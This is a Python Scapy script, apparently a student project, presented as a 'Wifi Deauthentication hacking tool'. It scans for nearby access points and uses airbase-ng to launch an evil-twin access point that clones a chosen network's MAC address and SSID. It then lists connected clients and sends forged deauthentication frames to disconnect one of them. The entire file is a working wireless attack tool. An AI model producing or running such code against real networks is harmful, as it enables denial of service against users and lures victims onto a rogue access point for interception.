#By: Adam Lev-Ari 204115547 % Nathan Almaleh 209633635
from scapy.all import *
import os, sys

monName = ""
ap_ssid = []
ap_channel = []
ap_list = []
sta_list = []
STA_addr = ""
AP_addr = ""

def menu() :
	print "\033[1;32;50m***********************************************"
	print " Wifi Deauthentication hacking tool!"
	print "***********************************************"
	print "By: Adam Lev-Ari 204115547 & Nathan Almaleh 209633635\n"
	print "\033[0;39;50m1.	Scan for nearby Access Points.\n2.	Exit.\n"
	global monName, MAC_channel
	choise = input()
	if choise == 1 :
		monName = raw_input("Enter mon card name: ")
		os.system ('clear')
		print "\nStart scanning for Wifi networks nearby.\nThis will take approxiamly 1 minute.\nHint: Press Ctrl+C to stop scanning"
		print "\n Channel: | AP MAC:            | SSID:"
		sniff(iface = monName, prn = packetHandler_AP)
		print "\nFinished scanning!"
		if len(ap_list) > 0:
			MAC_index = int(raw_input("Select desired AP: "))
			MAC_channel = ap_channel[MAC_index-1]
			#print "MAC: %s SSID: %s CHANNEL: %d MONITOR: %s" %(ap_list[MAC_index-1], ap_ssid[MAC_index-1], MAC_channel, monName)
		
			os.system('gnome-terminal -- airbase-ng -a "%s" --essid %s -c %d %s -F han'
				%(ap_list[MAC_index-1], ap_ssid[MAC_index-1],MAC_channel, monName) )
			#os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
			#os.system("python test.py")
			scanSTAs(MAC_index)
		else:
			print "No availble AP found"
			systemReset()
			menu()
	if choise == 2 :
		exit()

def packetHandler_AP(pkt) :
	global ap_list, ap_channel, ap_ssid
	try:
		channel = int(ord(pkt[Dot11Elt:3].info))
	except:
		channel = 0;
	if pkt.type == 0 and pkt.subtype == 8:
                if pkt.addr2 not in ap_list :
			ap_list.append(pkt.addr2)
			ap_channel.append(channel)
			ap_ssid.append(pkt.info)
                        print len(ap_list), " %d | %s | %s " %(channel, pkt.addr2, pkt.info)

def packetHandler_STA(pkt):
	global sta_list
	if pkt.type == 2:
		if pkt.addr2 not in sta_list and pkt.addr1 == AP_addr:
			sta_list.append(pkt.addr2)
                	print len(sta_list), "AP (MAC): %s      CONNECT TO (MAC): %s" %(pkt.addr1, pkt.addr2)

def systemReset():
	global ap_list, monName, sta_list,STA_addr, AP_addr, channels
	monName = ""
	ap_list = []
	sta_list = []
	STA_addr = ""
	AP_addr = ""
	channels = []


def scanSTAs(mac):
	global AP_addr
	AP_addr = ap_list[mac-1]
	print "MAC Adress: %s" %(AP_addr)
	print "Scanning for connected users...\n"
	sniff (iface = monName, prn = packetHandler_STA)
	if len(sta_list) > 0:
		MAC_index = int(input("Select desired Client: "))
		DeauthAttack(MAC_index)
	else: 
		print "No connected clients found..."
		systemReset()
		menu()

def DeauthAttack(mac):
	global STA_addr
	STA_addr = sta_list[mac-1]
	print "exsploit Deauth Atttack on STA: %s, AP: %s, Channel: %d" %(STA_addr, AP_addr, MAC_channel)
	frame = RadioTap()/Dot11(addr1 = STA_addr, addr2 = AP_addr, addr3 = AP_addr)/Dot11Deauth()
	
	sendp(frame, iface= monName, count = 10, inter = .5)
	print "You have succesfully exploit Deauth Attack on: %s\nSee you next time..." %(STA_addr)
	exit()



menu()
